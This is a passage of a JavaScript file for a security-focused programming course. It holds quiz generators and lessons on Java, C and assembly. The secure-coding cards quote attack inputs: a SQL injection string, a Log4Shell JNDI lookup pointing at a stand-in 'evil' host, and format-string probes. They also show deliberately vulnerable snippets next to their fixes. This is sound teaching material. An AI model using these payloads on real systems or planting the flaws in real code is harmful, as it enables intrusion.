/* Languages track for the CS degree, security-focused: Java, C, and x86-64 assembly.
   Syllabus backbones: CS50x (C weeks 1–5), MIT OCW 6.004 / 6.172 style systems topics, the CERT secure coding
   standards for C and Java (free from SEI), and OWASP. Lessons are original. Code-tracing cards are generated fresh.
   Assumptions stated where they matter: 64-bit Linux, gcc, Intel-syntax x86-64. */
(function () {
  var S = (window.RH_SUBJECTS || []).filter(function (s) { return s.id === 'cs'; })[0]; if (!S) return;
  var G = window.RH_GEN = window.RH_GEN || {};
  function r(a, b) { return a + Math.floor(Math.random() * (b - a + 1)); }
  function pk(a) { return a[Math.floor(Math.random() * a.length)]; }
  function shuffle(a) { a = a.slice(); for (var i = a.length - 1; i > 0; i--) { var j = Math.floor(Math.random() * (i + 1)); var t = a[i]; a[i] = a[j]; a[j] = t; } return a; }
  function mc(q, right, wrongs, why) { var seen = {}, opts = [String(right)]; seen[right] = 1; shuffle(wrongs).forEach(function (w) { w = String(w); if (!seen[w] && opts.length < 4) { seen[w] = 1; opts.push(w); } }); return { t: 'mcq', q: q, opts: opts, a: 0, why: why }; }
  function calc(q, a, why) { return { t: 'calc', q: q, a: a, tol: 0.001, why: why }; }
  function code(lines) { return '<pre>' + lines.join('\n').replace(/&/g, '&amp;').replace(/</g, '&lt;') + '</pre>'; }

  /* ================= generators: Java ================= */
  G.jvInt = function () {
    var a = r(7, 40), b = r(2, 9), k = r(0, 3);
    if (k === 0) return calc('What does this Java print?' + code(['int a = ' + a + ';', 'int b = ' + b + ';', 'System.out.println(a / b);']), Math.floor(a / b), 'Both are int, so Java does <b>integer division</b> and throws away the remainder: ' + a + ' / ' + b + ' = ' + Math.floor(a / b) + '. Python 3\'s / would give a decimal; Java\'s int / int never does.');
    if (k === 1) return calc('What does this Java print?' + code(['int a = ' + a + ';', 'System.out.println(a % ' + b + ');']), a % b, '% is the remainder: ' + a + ' = ' + Math.floor(a / b) + ' × ' + b + ' + ' + (a % b) + '.');
    if (k === 2) { var res = a / b; return mc('What does this Java print?' + code(['double x = (double) ' + a + ' / ' + b + ';', 'System.out.println(x > ' + Math.floor(a / b) + ');']), String(a % b !== 0), [String(a % b === 0), 'Compile error', String(Math.floor(a / b))], 'The cast happens first, so it\'s ' + a + '.0 / ' + b + ' = ' + (+res.toFixed(4)) + ' (real division). That is ' + (a % b !== 0 ? 'greater than' : 'equal to') + ' ' + Math.floor(a / b) + '. Without the cast, int / int would truncate.'); }
    var i = r(1, 9), j = i; var out = j++ + ++j;
    return calc('What does this Java print?' + code(['int j = ' + i + ';', 'int out = j++ + ++j;', 'System.out.println(out);']), out, 'j++ uses the old value (' + i + ') and then makes j = ' + (i + 1) + '. ++j adds first (j = ' + (i + 2) + ') and uses that. ' + i + ' + ' + (i + 2) + ' = ' + out + '. Real code shouldn\'t be written like this, but you\'ll see it on exams and in tricky code.');
  };
  G.jvLoop = function () {
    var n = r(3, 7), s = r(1, 3), k = r(0, 1), tot = 0, i;
    if (k === 0) { for (i = 1; i <= n; i += s) tot += i; return calc('What does this Java print?' + code(['int total = 0;', 'for (int i = 1; i <= ' + n + '; i += ' + s + ') {', '    total += i;', '}', 'System.out.println(total);']), tot, 'A for loop has three parts: start (i = 1), keep-going test (i <= ' + n + ', note the <= includes ' + n + '), and step (i += ' + s + '). i takes ' + (function () { var l = []; for (var j = 1; j <= n; j += s) l.push(j); return l.join(', '); })() + ' → total ' + tot + '.'); }
    var x = r(20, 60), c = 0, y = x; while (y > 5) { y -= 7; c++; }
    return calc('How many times does the loop body run?' + code(['int y = ' + x + ';', 'int count = 0;', 'while (y > 5) {', '    y -= 7;', '    count++;', '}']), c, 'Keep subtracting 7 until y is 5 or less: ' + x + ' → … → ' + y + '. That took ' + c + ' passes.');
  };
  G.jvStr = function () {
    var w = pk(['security', 'firewall', 'exploit', 'network', 'payload', 'kernel']), k = r(0, 2), a = r(0, 2), b = a + r(2, 4);
    if (k === 0) return mc('What does this Java print?' + code(['String s = "' + w + '";', 'System.out.println(s.substring(' + a + ', ' + b + '));']), w.substring(a, b), [w.substring(a, b + 1), w.substring(a + 1, b + 1), w.substring(a + 1, b)], 'substring(start, end) includes start and stops before end, just like a Python slice: indexes ' + a + ' to ' + (b - 1) + '.');
    if (k === 1) return mc('What does this Java print?' + code(['String s = "' + w + '";', 'System.out.println(s.charAt(' + a + ') + "" + s.length());']), w.charAt(a) + w.length, [w.charAt(a + 1) + w.length, w.charAt(a) + (w.length - 1), w.charAt(a)], 'charAt(' + a + ') is the character at index ' + a + ' (counting from 0); length() is ' + w.length + '. Joined as text.');
    return mc('Which line correctly checks if two Strings have the same text?', 'a.equals(b)', ['a == b', 'a = b', 'a.compare(b)'], 'In Java, == on objects checks whether they are the SAME object in memory, not the same text. Use .equals(). This bug is a classic in login checks.');
  };

  /* ================= generators: C ================= */
  G.cPtr = function () {
    var a = r(2, 9), b = r(2, 9), k = r(0, 2);
    if (k === 0) return calc('What does this C print?' + code(['int a = ' + a + ';', 'int *p = &a;', '*p = *p + ' + b + ';', 'printf("%d\\n", a);']), a + b, 'p holds the ADDRESS of a (&a = "address of a"). *p means "the thing p points to," which IS a. So *p = *p + ' + b + ' changes a to ' + (a + b) + '.');
    if (k === 1) return calc('What does this C print?' + code(['int a = ' + a + ', b = ' + b + ';', 'int *p = &a;', 'p = &b;', '*p = 0;', 'printf("%d %d\\n", a, b);', '/* type the FIRST number */']), a, 'p first points at a, then is re-pointed at b. *p = 0 sets b to 0. a is untouched: ' + a + '. (Output: "' + a + ' 0".)');
    var arr = [r(1, 9), r(1, 9), r(1, 9), r(1, 9)], i = r(1, 3);
    return calc('What does this C print?' + code(['int arr[] = {' + arr.join(', ') + '};', 'int *p = arr;', 'printf("%d\\n", *(p + ' + i + '));']), arr[i], 'An array name acts like a pointer to its first element. p + ' + i + ' moves ' + i + ' elements forward (not ' + i + ' bytes; C scales by the element size). *(p + ' + i + ') is the same as arr[' + i + '] = ' + arr[i] + '.');
  };
  G.cSize = function () {
    var w = pk(['hi', 'root', 'admin', 'kali', 'pfsense', 'shell']), k = r(0, 3);
    if (k === 0) return calc('On 64-bit Linux, what does this print?' + code(['char s[] = "' + w + '";', 'printf("%zu\\n", sizeof(s));']), w.length + 1, 'C strings end with a hidden <b>null terminator</b> byte (\\0). "' + w + '" is ' + w.length + ' letters + 1 terminator = ' + (w.length + 1) + ' bytes. Forgetting that +1 is a classic overflow bug.');
    if (k === 1) return calc('What does this print?' + code(['char s[] = "' + w + '";', 'printf("%zu\\n", strlen(s));']), w.length, 'strlen counts characters up to (not including) the \\0: ' + w.length + '.');
    if (k === 2) { var n = r(3, 10); return calc('On 64-bit Linux (int = 4 bytes), what does this print?' + code(['int nums[' + n + '];', 'printf("%zu\\n", sizeof(nums));']), n * 4, n + ' ints × 4 bytes = ' + (n * 4) + '.'); }
    var t = pk([['char', 1], ['int', 4], ['long', 8], ['double', 8], ['char *', 8], ['int *', 8]]);
    return mc('On typical 64-bit Linux, what is sizeof(' + t[0] + ')?', t[1] + ' bytes', ['1 bytes', '2 bytes', '4 bytes', '8 bytes', '16 bytes'], 'Common 64-bit Linux sizes: char 1, short 2, int 4, long 8, double 8, and every pointer 8 (it holds a 64-bit address). C only guarantees minimums, which is why sizeof exists.');
  };
  G.cWrap = function () {
    var a = r(200, 250), b = r(10, 80), k = r(0, 1);
    if (k === 0) return calc('What does this print?' + code(['unsigned char x = ' + a + ';', 'x = x + ' + b + ';', 'printf("%d\\n", x);']), (a + b) % 256, 'unsigned char holds 0–255. ' + a + ' + ' + b + ' = ' + (a + b) + ', which wraps around: ' + (a + b) + ' − 256 = ' + ((a + b) % 256) + '. Integer wraparound in a length or size calculation can lead to allocating a tiny buffer and then overflowing it.');
    var c = r(1, 20);
    return calc('What does this print?' + code(['unsigned int x = ' + c + ';', 'x = x - ' + (c + 1) + ';', 'printf("%u\\n", x);']), 4294967295, 'Unsigned ints can\'t go negative. 0 − 1 wraps to the max value, 2³² − 1 = 4294967295. A check like "if (len - 1 < size)" can be fooled this way.');
  };

  /* ================= generators: assembly (x86-64, Intel syntax) ================= */
  var R64 = ['rax', 'rbx', 'rcx', 'rdx'];
  G.asmTrace = function () {
    var a = r(1, 20), b = r(1, 20), c = r(1, 5), reg = pk(['rbx', 'rcx']), k = r(0, 2), lines, v;
    if (k === 0) { v = a + b - c; lines = ['mov rax, ' + a, 'mov ' + reg + ', ' + b, 'add rax, ' + reg, 'sub rax, ' + c]; }
    else if (k === 1) { v = (a + 1) * c; lines = ['mov rax, ' + a, 'inc rax', 'imul rax, ' + c]; }
    else { v = (a ^ a) + b; lines = ['mov rax, ' + a, 'xor rax, rax', 'add rax, ' + b]; }
    return calc('After these x86-64 instructions run, what is in <b>rax</b> (decimal)?' + code(lines), v, 'Intel syntax is <b>op destination, source</b>: the result lands in the first operand. ' + (k === 0 ? 'rax = ' + a + ', then + ' + b + ' = ' + (a + b) + ', then − ' + c + ' = ' + v + '.' : k === 1 ? 'rax = ' + a + ', inc adds 1 → ' + (a + 1) + ', imul multiplies by ' + c + ' → ' + v + '.' : 'xor of a register with itself is always 0 (compilers use it as a fast way to zero a register), then + ' + b + ' = ' + v + '.'));
  };
  G.asmLoop = function () {
    var n = r(3, 8), k = r(2, 6);
    return calc('What is in <b>eax</b> when this loop finishes?' + code(['    mov ecx, ' + n, '    xor eax, eax', 'top:', '    add eax, ' + k, '    dec ecx', '    jnz top']), n * k, 'ecx is the counter. Each pass adds ' + k + ' to eax and subtracts 1 from ecx. jnz ("jump if not zero") loops back until dec makes ecx 0. That\'s ' + n + ' passes: ' + n + ' × ' + k + ' = ' + (n * k) + '. This is what a compiled for loop looks like.');
  };
  G.asmStack = function () {
    var v = shuffle([3, 5, 7, 9, 11]).slice(0, 3), lines = ['push ' + v[0], 'push ' + v[1], 'push ' + v[2], 'pop rax', 'pop rbx'];
    return mc('After these instructions, what is in <b>rbx</b>?' + code(lines), v[1], [v[0], v[2], 0], 'The stack is LIFO. Pushes go ' + v.join(', ') + '. First pop takes the top (' + v[2] + ') into rax; second pop takes ' + v[1] + ' into rbx. Each push moves rsp DOWN 8 bytes; each pop moves it back up.');
  };
  G.asmJump = function () {
    var a = r(1, 20), b = r(1, 20), j = pk([['je', 'equal', a === b], ['jne', 'not equal', a !== b], ['jl', 'less (signed)', a < b], ['jg', 'greater (signed)', a > b], ['jge', 'greater or equal', a >= b]]);
    return mc('Is the jump taken?' + code(['mov rax, ' + a, 'mov rbx, ' + b, 'cmp rax, rbx', j[0] + ' target']), j[2] ? 'Yes, it jumps' : 'No, it falls through', ['Yes, it jumps', 'No, it falls through'], 'cmp rax, rbx works out rax − rbx and only sets flags. ' + j[0] + ' jumps if rax is ' + j[1] + ' compared to rbx: ' + a + ' vs ' + b + ' → ' + (j[2] ? 'taken' : 'not taken') + '. Every if statement in compiled code becomes cmp + a conditional jump.');
  };

  /* ================= units ================= */
  var java = {
    name: 'Java', tag: 'CS1/CS2 · OOP',
    blurb: 'The language most universities teach CS1 and CS2 in. Static types, classes, objects, and the security bugs that show up in enterprise Java.',
    lessons: [
      {
        id: 'jv-basics', title: 'Java basics: types, compiling & running', min: 10, teaser: 'Static types, main(), javac and the JVM.',
        pre: ['py-vars'], links: ['jv-control', 'sys-run'],
        cards: [
          { t: 'read', h: 'Why Java', body: '<p>Java runs a huge share of enterprise software: banks, Android apps, big back-end systems, and security tools like Burp Suite and Ghidra. It\'s the classic language for university intro courses (CS1/CS2) and the AP CS A exam, so learning it means learning the vocabulary every CS course assumes.</p><p>Free setup: install a JDK (Eclipse Temurin from adoptium.net) and an editor like VS Code or IntelliJ Community.</p>' },
          { t: 'read', h: 'Hello, compiled', body: code(['public class Hello {', '    public static void main(String[] args) {', '        System.out.println("Hello, Nate");', '    }', '}']) + '<p>Everything lives inside a <b>class</b>. The program starts at <code>main</code>. Run it with <code>javac Hello.java</code> (compiles to <b>bytecode</b>, Hello.class) then <code>java Hello</code> (the <b>JVM</b>, Java Virtual Machine, runs the bytecode). That\'s why Java runs on any OS with a JVM: "write once, run anywhere."</p>' },
          { t: 'read', h: 'Static types', body: '<p>Unlike Python, every variable has a declared type, checked when you compile:</p>' + code(['int age = 25;           // whole number, 32-bit', 'long big = 9000000000L;  // 64-bit', 'double price = 4.99;', 'boolean admin = false;', 'char grade = \'A\';', 'String name = "nate";    // a class, not a primitive', '', 'age = "old";             // compile ERROR: wrong type']) + '<p>The compiler catches type mistakes before the program ever runs. That\'s the big trade: more typing up front, fewer surprises later.</p>', mem: 'Java: declare the type, compile with javac, run on the JVM.' },
          { t: 'gen', g: 'jvInt' }, { t: 'gen', g: 'jvInt' },
          { t: 'explain', q: 'Explain the difference between how Python and Java run your code.', points: ['Java compiles source to bytecode with javac first', 'The JVM runs the bytecode, so it works on any OS with a JVM', 'Java checks types at compile time; Python checks while running', 'Python runs the .py file directly with the interpreter'] }
        ]
      },
      {
        id: 'jv-control', title: 'Control flow, methods & arrays', min: 10, teaser: 'if, loops, methods with types, and fixed-size arrays.',
        pre: ['jv-basics'], links: ['jv-oop', 'py-loops'],
        cards: [
          { t: 'read', h: 'Same ideas, curly braces', body: code(['for (int i = 0; i < 5; i++) {', '    if (i % 2 == 0) {', '        System.out.println(i + " is even");', '    } else {', '        System.out.println(i + " is odd");', '    }', '}']) + '<p>Blocks use <code>{ }</code> instead of indentation, statements end with <code>;</code>, and conditions go in parentheses. <code>&amp;&amp;</code> is and, <code>||</code> is or, <code>!</code> is not. <code>i++</code> adds 1.</p>' },
          { t: 'read', h: 'Methods and arrays', body: code(['static int countFailures(String[] lines) {', '    int count = 0;', '    for (String line : lines) {', '        if (line.contains("Failed")) count++;', '    }', '    return count;', '}']) + '<p>A method declares its <b>return type</b> (<code>int</code>) and each parameter\'s type. Arrays are fixed size: <code>int[] a = new int[10];</code> makes 10 zeros. Going past the end throws <code>ArrayIndexOutOfBoundsException</code>, so Java can\'t silently overflow memory the way C can.</p>' },
          { t: 'gen', g: 'jvLoop' }, { t: 'gen', g: 'jvLoop' }, { t: 'gen', g: 'jvStr' },
          { t: 'mcq', q: 'What happens in Java when you write to <code>arr[10]</code> on a 10-element array?', opts: ['It silently writes past the end', 'ArrayIndexOutOfBoundsException is thrown', 'The array grows', 'Compile error every time'], a: 1, why: 'Java checks bounds at runtime. C does not, which is the root of buffer overflows.' }
        ]
      },
      {
        id: 'jv-oop', title: 'Classes, objects & encapsulation', min: 11, teaser: 'Blueprints, instances, constructors, private fields.',
        pre: ['jv-control'], links: ['jv-inherit'],
        cards: [
          { t: 'read', h: 'Class = blueprint, object = the thing', body: code(['public class Account {', '    private String user;', '    private int failedLogins = 0;', '', '    public Account(String user) {   // constructor', '        this.user = user;', '    }', '    public void recordFailure() {', '        failedLogins++;', '    }', '    public boolean isLocked() {', '        return failedLogins >= 5;', '    }', '}', '', 'Account a = new Account("nate");', 'a.recordFailure();']) + '<p>A <b>class</b> describes data (fields) and behavior (methods). <code>new</code> creates an <b>object</b> (an instance). The <b>constructor</b> runs once when it\'s created. <code>this</code> means "this object."</p>' },
          { t: 'read', h: 'Encapsulation', body: '<p>Fields are <code>private</code>: outside code can\'t reach in and set <code>failedLogins = 0</code>. It must go through public methods, which can enforce rules. That\'s <b>encapsulation</b>, and it\'s a security idea as much as a design one: one controlled door instead of open windows.</p>', mem: 'Private data, public methods. Control the doors.' },
          { t: 'mcq', q: 'Why make failedLogins private?', opts: ['It runs faster', 'Other code can\'t reset it directly; it has to go through methods that enforce the rules', 'Java requires all fields be private', 'So it can\'t be printed'], a: 1, why: 'Encapsulation protects an object\'s state from being changed in ways the class didn\'t allow.' },
          { t: 'tf', q: 'Each object made with new Account(...) has its own separate failedLogins value.', a: true, why: 'Instance fields belong to each object. (A field marked static would be shared by all of them.)' },
          { t: 'explain', q: 'Explain the difference between a class and an object, with an example.', points: ['A class is the blueprint: fields and methods', 'An object is one instance made with new', 'Each object has its own field values', 'Example: Account class, objects for each user'] }
        ]
      },
      {
        id: 'jv-inherit', title: 'Inheritance, interfaces & polymorphism', min: 10, teaser: 'The three words every OOP interview asks about.',
        pre: ['jv-oop'], links: ['jv-collections'],
        cards: [
          { t: 'read', h: 'Inheritance', body: code(['class Device {', '    String name;', '    void patch() { System.out.println("patching " + name); }', '}', 'class Server extends Device {', '    @Override', '    void patch() { System.out.println("draining traffic, then patching " + name); }', '}']) + '<p><code>Server extends Device</code>: a Server <b>is a</b> Device and gets its fields and methods, and can <b>override</b> them with its own version.</p>' },
          { t: 'read', h: 'Interfaces and polymorphism', body: code(['interface Scanner { List<String> scan(String target); }', 'class PortScanner implements Scanner { ... }', 'class WebScanner implements Scanner { ... }', '', 'for (Scanner s : scanners) s.scan(target);   // each runs its own version']) + '<p>An <b>interface</b> is a contract: "anything that implements me has these methods." <b>Polymorphism</b> means code written against the interface works with any class that implements it, and the right version runs automatically. This is how plugin systems (Burp extensions, for example) work.</p>', mem: 'Inheritance = is-a. Interface = can-do. Polymorphism = same call, right version runs.' },
          { t: 'mcq', q: 'A variable of type Device holds a Server object. Calling patch() runs…', opts: ['Device\'s version', 'Server\'s overridden version', 'Both', 'Neither, compile error'], a: 1, why: 'Java picks the method from the actual object at runtime (dynamic dispatch). That is polymorphism.' },
          { t: 'explain', q: 'Explain polymorphism with a real example.', points: ['Code is written against a shared type (interface or parent class)', 'Different classes implement or override the method', 'At runtime the object\'s own version runs', 'Example: a list of Scanners, each scan() does its own thing'] }
        ]
      },
      {
        id: 'jv-collections', title: 'Collections, generics & exceptions', min: 10, teaser: 'ArrayList, HashMap, try/catch.',
        pre: ['jv-inherit'], links: ['jv-secure', 'ds-hash'],
        cards: [
          { t: 'read', h: 'Collections', body: code(['List<String> ips = new ArrayList<>();', 'ips.add("10.0.0.5");', 'Map<String, Integer> fails = new HashMap<>();', 'fails.put("10.0.0.5", fails.getOrDefault("10.0.0.5", 0) + 1);']) + '<p><code>ArrayList</code> is Java\'s growable list (like a Python list). <code>HashMap</code> is a hash table (like a Python dict). The <code>&lt;String, Integer&gt;</code> part is <b>generics</b>: it tells the compiler what types go inside, so mistakes are caught at compile time.</p>' },
          { t: 'read', h: 'Exceptions', body: code(['try {', '    int port = Integer.parseInt(input);', '} catch (NumberFormatException e) {', '    System.out.println("Not a number: " + input);', '} finally {', '    log.close();', '}']) + '<p>Errors are <b>thrown</b> as exception objects and <b>caught</b> with try/catch. <code>finally</code> always runs (good for cleanup). <b>Checked</b> exceptions (like IOException) must be handled or declared; <b>unchecked</b> ones (like NullPointerException) are bugs you should prevent.</p>' },
          { t: 'mcq', q: 'Which Java type is the equivalent of a Python dictionary?', opts: ['ArrayList', 'HashMap', 'String[]', 'Interface'], a: 1, why: 'HashMap maps keys to values with fast hash lookups.' },
          { t: 'mcq', q: 'Security-wise, what\'s wrong with showing users e.printStackTrace() output on an error page?', opts: ['Nothing', 'It leaks internal details (class names, paths, versions) attackers can use', 'It\'s slow', 'It hides the error'], a: 1, why: 'Verbose errors are information disclosure. Log details server-side, show users a generic message.' }
        ]
      },
      {
        id: 'jv-secure', title: 'Secure Java: injection, deserialization & Log4Shell', min: 12, teaser: 'The bugs that made headlines, and the fixes.',
        pre: ['jv-collections'], links: ['sp-vulns-app', 'sp-attacks'],
        cards: [
          { t: 'read', h: 'SQL injection and PreparedStatement', body: '<p>Vulnerable:</p>' + code(['String q = "SELECT * FROM users WHERE name = \'" + name + "\'";', 'stmt.executeQuery(q);']) + '<p>If name is <code>\' OR \'1\'=\'1</code>, the query returns every user. Fixed:</p>' + code(['PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE name = ?");', 'ps.setString(1, name);']) + '<p>A <b>parameterized query</b> sends the data separately from the SQL, so input can never become code.</p>', mem: 'Never build SQL by gluing strings. Use ? parameters.' },
          { t: 'read', h: 'Deserialization and Log4Shell', body: '<p><b>Insecure deserialization</b>: Java can turn bytes back into objects (<code>ObjectInputStream.readObject</code>). If those bytes come from an attacker, crafted objects can trigger code during rebuilding. Fix: don\'t deserialize untrusted data; use JSON with strict schemas, or allow-list classes.</p><p><b>Log4Shell (CVE-2021-44228, Dec 2021)</b>: the popular Log4j logging library would interpret text like <code>${jndi:ldap://evil/x}</code> inside logged strings, fetch a remote object and run it. Simply logging a username or a User-Agent header could give an attacker remote code execution. Fixes: upgrade Log4j, and know what libraries you ship (an SBOM, software bill of materials).</p>',
            deeper: '<p>Lessons Log4Shell teaches for Security+ and real jobs: dependency (supply-chain) risk, why an SBOM matters, egress filtering (the exploit needed an outbound LDAP connection), and why "treat all input as untrusted" includes data you only log.</p>' },
          { t: 'pbq', h: 'Secure code review', scenario: 'Match each Java pattern to its risk or fix.', opts: ['SQL injection', 'Use PreparedStatement', 'Insecure deserialization', 'Information disclosure', 'Vulnerable dependency', 'Comparing text with =='],
            rows: [
              { label: '"SELECT ... WHERE id=" + userInput', a: 0 },
              { label: 'The fix for string-built queries', a: 1 },
              { label: 'readObject() on bytes from a network request', a: 2 },
              { label: 'Stack traces shown on the error page', a: 3 },
              { label: 'Shipping Log4j 2.14', a: 4 },
              { label: 'if (password == stored)', a: 5 }
            ], why: 'These six account for a big share of real Java security findings.' },
          { t: 'gen', g: 'jvStr' },
          { t: 'explain', q: 'Explain why PreparedStatement stops SQL injection.', points: ['The SQL structure is sent first with ? placeholders', 'User input is sent separately as data', 'The database never parses the input as SQL code', 'String concatenation lets input change the query'] }
        ]
      }
    ]
  };

  var c = {
    name: 'C: the language under everything', tag: 'CS50 wk 1–5 · systems',
    blurb: 'Operating systems, routers, IoT, Python itself: all written in C. Pointers, manual memory, and why most of the worst vulnerabilities in history are C bugs.',
    lessons: [
      {
        id: 'c-basics', title: 'C basics: compile, types & printf', min: 10, teaser: 'gcc, main, and types with exact sizes.',
        pre: ['py-func', 'sys-run'], links: ['c-pointers'],
        cards: [
          { t: 'read', h: 'Why C matters for security', body: '<p>The Linux kernel, Windows internals, firmware, network stacks, and the Python interpreter are written in C. C gives you direct control of memory and no safety checks. That makes it fast and makes its bugs exploitable. To understand buffer overflows, use-after-free, or how exploits and malware work, you need C.</p><p>Free setup: <code>gcc</code> is already on your Kali VM (<code>sudo apt install build-essential</code> elsewhere).</p>' },
          { t: 'read', h: 'Hello, C', body: code(['#include <stdio.h>', '', 'int main(void) {', '    int port = 443;', '    printf("Listening on %d\\n", port);', '    return 0;', '}']) + '<p>Compile with <code>gcc hello.c -o hello -Wall</code>, run with <code>./hello</code>. <code>#include</code> pulls in library declarations. <code>printf</code> uses <b>format specifiers</b>: <code>%d</code> int, <code>%s</code> string, <code>%c</code> char, <code>%x</code> hex, <code>%p</code> pointer. <code>return 0</code> means success. <code>-Wall</code> turns on warnings; always use it.</p>' },
          { t: 'read', h: 'Types have sizes', body: '<p>On 64-bit Linux: <code>char</code> 1 byte, <code>int</code> 4, <code>long</code> 8, <code>double</code> 8, any pointer 8. <code>unsigned</code> types can\'t be negative and <b>wrap around</b> when they overflow. Signed overflow is <b>undefined behavior</b>: the compiler may assume it never happens, which can delete your safety checks.</p>', mem: 'char 1, int 4, long 8, pointer 8 (64-bit Linux).' },
          { t: 'gen', g: 'cSize' }, { t: 'gen', g: 'cWrap' },
          { t: 'explain', q: 'Explain why C is so important to learn for a cybersecurity career.', points: ['Operating systems, firmware and network stacks are written in C', 'C has no automatic bounds or memory checks', 'Memory bugs in C become exploitable vulnerabilities', 'Exploits, malware analysis and reverse engineering assume C knowledge'] }
        ]
      },
      {
        id: 'c-pointers', title: 'Pointers & addresses', min: 12, teaser: 'The concept that unlocks C (and exploits).',
        pre: ['c-basics'], links: ['c-strings', 'cs-data'],
        cards: [
          { t: 'read', h: 'Every variable has an address', body: code(['int a = 7;', 'int *p = &a;      // p holds the address of a', 'printf("%p\\n", (void *)p);   // something like 0x7ffd5e8c', 'printf("%d\\n", *p);          // 7  (follow the pointer)', '*p = 42;          // changes a!']) + '<ul><li><code>&amp;a</code>: "address of a."</li><li><code>int *p</code>: p is a pointer to an int.</li><li><code>*p</code>: "the value at the address in p" (dereference).</li></ul>', mem: '& = address of. * = go to that address.' },
          { t: 'read', h: 'Why pointers exist', body: '<p>C passes arguments by <b>copy</b>. To let a function change your variable, pass its address:</p>' + code(['void reset(int *count) { *count = 0; }', 'reset(&failed);']) + '<p>Pointers also let you work with arrays, strings, and memory you allocate while running. Arrays and pointers are closely tied: <code>arr[i]</code> is the same as <code>*(arr + i)</code>.</p><p>A pointer to nowhere is <code>NULL</code>; dereferencing it crashes (segmentation fault). A pointer to memory that was freed is a <b>dangling pointer</b>, which leads to use-after-free.</p>' },
          { t: 'gen', g: 'cPtr' }, { t: 'gen', g: 'cPtr' }, { t: 'gen', g: 'cPtr' },
          { t: 'explain', q: 'Explain pointers to someone who only knows Python.', points: ['Every variable lives at a memory address', 'A pointer is a variable that stores an address', '& gets an address, * follows it to the value', 'Lets functions change the caller\'s variables and work with memory directly'] }
        ]
      },
      {
        id: 'c-strings', title: 'Arrays, strings & the null terminator', min: 10, teaser: 'Why C strings are where overflows start.',
        pre: ['c-pointers'], links: ['c-memory', 'c-vulns'],
        cards: [
          { t: 'read', h: 'A C string is just bytes ending in 0', body: '<p><code>char name[] = "nate";</code> is 5 bytes: <code>n a t e \\0</code>. C has no string type and no length stored anywhere. Functions find the end by walking until they hit the <b>\\0</b> (null byte). Lose the terminator and functions keep reading into whatever memory comes next.</p>' + code(['char buf[8];', 'strcpy(buf, input);   // copies until \\0, no matter how long input is']) + '<p>If input is 20 characters, strcpy writes 21 bytes into an 8-byte buffer. Nothing stops it.</p>', mem: 'C strings end in \\0. Size = letters + 1.' },
          { t: 'read', h: 'Safer patterns', body: '<ul><li><code>fgets(buf, sizeof buf, stdin)</code> instead of <code>gets</code> (gets is so dangerous it was removed from the C standard).</li><li><code>snprintf(buf, sizeof buf, "%s", input)</code> instead of <code>sprintf</code> / <code>strcpy</code>: it never writes more than the size you give it.</li><li>Always pass and check buffer sizes. Remember the +1 for \\0.</li></ul>' },
          { t: 'gen', g: 'cSize' }, { t: 'gen', g: 'cSize' },
          { t: 'mcq', q: 'Which function is so unsafe it was removed from the C standard?', opts: ['printf', 'gets', 'fgets', 'strlen'], a: 1, why: 'gets() reads a line with no length limit, so any long input overflows the buffer. Use fgets with a size.' }
        ]
      },
      {
        id: 'c-memory', title: 'Memory: stack, heap, malloc & free', min: 11, teaser: 'Manual memory, and the bugs it creates.',
        pre: ['c-strings'], links: ['c-vulns', 'sys-run'],
        cards: [
          { t: 'read', h: 'Asking for memory', body: code(['int *list = malloc(100 * sizeof(int));', 'if (list == NULL) { /* out of memory */ return 1; }', '/* ... use list ... */', 'free(list);', 'list = NULL;']) + '<p><code>malloc</code> gets memory from the <b>heap</b> and returns a pointer. You must <code>free</code> it exactly once when done. Local variables live on the <b>stack</b> and vanish when the function returns.</p>' },
          { t: 'read', h: 'The classic memory bugs', body: '<ul><li><b>Memory leak</b>: never calling free. The program slowly eats RAM (a denial-of-service risk on servers).</li><li><b>Use-after-free</b>: using a pointer after free. That memory may now hold something else, maybe attacker-controlled data. A top browser exploit class.</li><li><b>Double free</b>: freeing twice corrupts the allocator\'s bookkeeping and can be exploited.</li><li><b>Returning a pointer to a local variable</b>: it points into a stack frame that no longer exists.</li></ul><p>Tools that catch these: <code>valgrind</code> and gcc\'s <code>-fsanitize=address</code> (AddressSanitizer). Use them on everything you write.</p>', mem: 'malloc once, free once, then set to NULL.' },
          { t: 'pbq', h: 'Name that memory bug', scenario: 'Match each snippet description to the bug.', opts: ['Memory leak', 'Use-after-free', 'Double free', 'Buffer overflow', 'NULL dereference'],
            rows: [
              { label: 'malloc in a loop, never freed', a: 0 },
              { label: 'free(p); then printf("%s", p);', a: 1 },
              { label: 'free(p); ... free(p);', a: 2 },
              { label: 'char b[8]; strcpy(b, long_input);', a: 3 },
              { label: 'p = malloc(huge); *p = 1; with no NULL check', a: 4 }
            ], why: 'These five are the core of memory-safety bugs, and why Rust/Go/Java/Python exist.' },
          { t: 'explain', q: 'Explain use-after-free and why attackers like it.', points: ['Memory is freed but a pointer to it is still used', 'The allocator can hand that memory to something else', 'An attacker can arrange for their data to fill it', 'The program then trusts attacker data as its own object'] }
        ]
      },
      {
        id: 'c-vulns', title: 'C vulnerabilities & mitigations', min: 12, teaser: 'Overflows, format strings, integer bugs, and the defenses.',
        pre: ['c-memory'], links: ['asm-stack', 'sp-vulns-app'],
        cards: [
          { t: 'read', h: 'Stack buffer overflow', body: '<p>A function\'s stack frame holds its local buffers and, nearby, the <b>saved return address</b> (where to jump when the function ends). Overflow a local buffer far enough and you overwrite that address. When the function returns, the CPU jumps wherever the overwritten value says. That\'s how the 1988 Morris worm spread, and it\'s still the textbook exploit.</p>' },
          { t: 'read', h: 'Format strings and integer bugs', body: '<p><b>Format string bug</b>: <code>printf(user_input)</code> instead of <code>printf("%s", user_input)</code>. If the input contains <code>%x %x %x</code>, printf reads values off the stack (leaking memory); <code>%n</code> can even write. Fix: never let input be the format.</p><p><b>Integer overflow</b>: a size calculation wraps around to a small number, a small buffer is allocated, then a large copy overflows it.</p>' },
          { t: 'read', h: 'Mitigations (layers)', body: '<ul><li><b>Stack canaries</b> (<code>-fstack-protector-strong</code>): a random value before the return address, checked on return.</li><li><b>DEP / NX</b>: the stack and heap aren\'t executable, so injected code can\'t run directly.</li><li><b>ASLR</b>: memory locations are randomized each run, so addresses can\'t be hard-coded.</li><li><b>Safe functions + compiler warnings + sanitizers + fuzzing</b>.</li><li><b>Memory-safe languages</b>: in 2024 the US government (CISA, ONCD) urged moving new code to languages like Rust, Go, Java, C#, Python.</li></ul><p>Attackers respond with techniques like return-oriented programming (ROP), which reuses existing code; that\'s why mitigations are layered.</p>', mem: 'Canary, NX, ASLR: three layers against overflows.' },
